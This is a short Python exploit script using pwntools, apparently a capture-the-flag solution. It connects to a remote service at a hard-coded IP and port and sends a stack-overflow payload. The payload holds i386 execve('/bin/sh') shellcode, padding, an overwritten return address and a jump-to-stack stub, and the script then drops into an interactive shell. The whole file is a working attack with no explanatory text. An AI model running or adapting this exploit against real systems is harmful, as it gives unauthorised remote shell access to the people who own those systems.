from pwn import *
context(arch = 'i386', os = 'linux')

r = remote('188.166.226.181', 4242)
# EXPLOIT CODE GOES HERE
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += "A"*9
payload += "\x80\xf4\xff\xbf"
payload += "\x04\x85\x04\x08"
payload += "\x83\xec\x28\xff\xe4"
print payload
r.send(payload)
r.interactive()